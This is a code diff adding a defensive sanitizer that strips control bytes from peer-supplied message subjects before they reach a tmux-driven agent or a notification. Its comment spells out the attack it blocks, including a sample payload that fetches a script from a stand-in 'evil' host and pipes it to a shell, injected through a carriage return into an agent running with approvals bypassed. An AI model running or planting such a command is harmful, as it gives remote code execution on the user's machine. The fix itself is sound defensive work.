@@ -30,6 +30,34 @@ const DEFAULT_SSE_IDLE_MS = 45_000
 const CATCHUP_COOLDOWN_MS = 30_000
 
 /**
+ * Clean a peer- or server-controlled string before it is embedded anywhere.
+ *
+ * Both wake paths carry a `subject` and a `fromPart` chosen by whoever sent the
+ * message, and `sendMessageInput` validates subject with min(1) and no maximum. What
+ * that reaches differs per consumer, so the danger differs too:
+ *
+ *   - the pager types it through `tmux send-keys -l --`, which sends bytes LITERALLY:
+ *     a carriage return IS the submit key, so `\r!curl evil|sh\r` would run a command
+ *     inside an agent that often has approvals bypassed. That is remote code execution
+ *     driven by a message subject.
+ *   - the channel server puts it into a notification rendered with attributes, where a
+ *     quote or an angle bracket can break out of the field it was supposed to fill.
+ *
+ * One function for both, so a path cannot be left without it again - which is exactly
+ * what happened: the pager grew this and the channel server never did. Strips every C0
+ * control byte and DEL, collapses whitespace and clamps the length. Written as a
+ * code-point loop rather than a regex literal so no control byte lives in this source.
+ */
+export function sanitizeField(s, max = 120) {
+  let out = ""
+  for (const ch of String(s ?? "")) {
+    const code = ch.codePointAt(0)
+    out += (code <= 0x1f || code === 0x7f) ? " " : ch
+  }
+  return out.replace(/ +/g, " ").trim().slice(0, max)
+}
+
+/**
  * Exponential backoff with a ceiling, shared so both consumers retry on one curve.
  * `attempt` is 0-based. The exponent is capped as well as the result: without that,
  * a long outage grows 2**attempt until it overflows to Infinity, and `Math.min` on
